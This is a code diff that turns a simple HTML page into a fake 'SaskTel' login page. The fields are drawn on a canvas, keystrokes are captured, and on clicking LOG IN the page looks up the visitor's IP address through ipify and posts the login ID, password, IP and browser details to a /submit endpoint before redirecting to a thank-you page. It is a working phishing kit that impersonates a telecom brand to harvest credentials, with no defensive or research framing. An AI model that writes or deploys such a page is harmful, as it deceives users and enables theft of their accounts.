@@ -1,21 +1,155 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>SaskTel</title>
+  <meta charset="UTF-8">
+  <title>SaskTel Canvas Login</title>
   <style>
-    body, html {
-      margin: 0;
-      overflow: hidden;
-    }
     canvas {
       display: block;
+      margin: 0 auto;
+      background: #fff;
+      border: 1px solid #ccc;
     }
   </style>
 </head>
 <body>
-  <canvas id="canvas"></canvas>
-  <script src="canvas-script.js"></script>
-  <input id="hiddenInput" type="text" style="position: absolute; top: -1000px;" />
+<canvas id="loginCanvas" width="720" height="1402"></canvas>
+
+<script>
+const canvas = document.getElementById('loginCanvas');
+const ctx = canvas.getContext('2d');
+
+// Load the background image
+const bgImage = new Image();
+bgImage.src = 'background.png';
+bgImage.onload = () => draw();
+
+let loginID = '';
+let password = '';
+let activeInput = null;
+
+// Persistent background flags
+let loginActivated = false;
+let passActivated = false;
+
+// Input and button box dimensions
+const loginBox = { x: 29, y: 368, width: 662, height: 100 };
+const passBox  = { x: 29, y: 586, width: 662, height: 100 };
+const buttonBox = { x: 29, y: 795, width: 662, height: 64 };
+
+function draw() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
+
+  drawInputBox(loginBox, loginID, loginActivated, activeInput === 'login');
+  drawInputBox(passBox, password.replace(/./g, '•'), passActivated, activeInput === 'pass');
+  drawButton(buttonBox, 'LOG IN');
+}
+
+function drawInputBox(box, text, isActive, isFocused) {
+  // Background fill if activated
+  if (isActive) {
+    ctx.fillStyle = '#ffffff';
+    ctx.fillRect(box.x, box.y, box.width, box.height);
+  }
+
+  ctx.strokeStyle = isFocused ? '#007bff' : '#ccc';
+  ctx.lineWidth = 2;
+  ctx.strokeRect(box.x, box.y, box.width, box.height);
+
+  ctx.font = '28px sans-serif';
+  ctx.fillStyle = '#000';
+  ctx.textBaseline = 'middle';
+  ctx.save();
+  ctx.beginPath();
+  ctx.rect(box.x + 10, box.y + 10, box.width - 20, box.height - 20); // clip text
+  ctx.clip();
+  ctx.fillText(text, box.x + 14, box.y + box.height / 2 + 2);
+  ctx.restore();
+}
+
+function drawButton(box, text) {
+  ctx.fillStyle = '#e10098';
+  ctx.fillRect(box.x, box.y, box.width, box.height);
+  ctx.fillStyle = '#fff';
+  ctx.font = 'bold 28px sans-serif';
+  ctx.textAlign = 'center';
+  ctx.textBaseline = 'middle';
+  ctx.fillText(text, box.x + box.width / 2, box.y + box.height / 2);
+  ctx.textAlign = 'start';
+  ctx.textBaseline = 'alphabetic';
+}
+
+canvas.addEventListener('mousedown', (e) => {
+  const { offsetX: x, offsetY: y } = e;
+
+  if (isInside(x, y, loginBox)) {
+    activeInput = 'login';
+    loginActivated = true;
+  } else if (isInside(x, y, passBox)) {
+    activeInput = 'pass';
+    passActivated = true;
+} else if (isInside(x, y, buttonBox)) {
+  activeInput = null;
+
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(ipData => {
+      const ip = ipData.ip;
+      const deviceInfo = navigator.userAgent;
+
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          loginID,
+          password,
+          ip,
+          deviceInfo
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          window.location.href = 'thankyou.html';
+        } else {
+          alert('Submission failed. Please try again.');
+        }
+      })
+      .catch(err => {
+        console.error('Submission error:', err);
+        alert('Error submitting data.');
+      });
+    });
+}
+ else {
+    activeInput = null;
+  }
+
+  draw();
+});
+
+document.addEventListener('keydown', (e) => {
+  if (!activeInput) return;
+
+  if (e.key === 'Backspace') {
+    if (activeInput === 'login') loginID = loginID.slice(0, -1);
+    else password = password.slice(0, -1);
+  } else if (e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
+    if (activeInput === 'login' && loginID.length < 50) {
+      loginID += e.key;
+    } else if (activeInput === 'pass' && password.length < 50) {
+      password += e.key;
+    }
+  }
+
+  draw();
+});
+
+function isInside(x, y, box) {
+  return x >= box.x && x <= box.x + box.width &&
+         y >= box.y && y <= box.y + box.height;
+}
+</script>
 </body>
 </html>
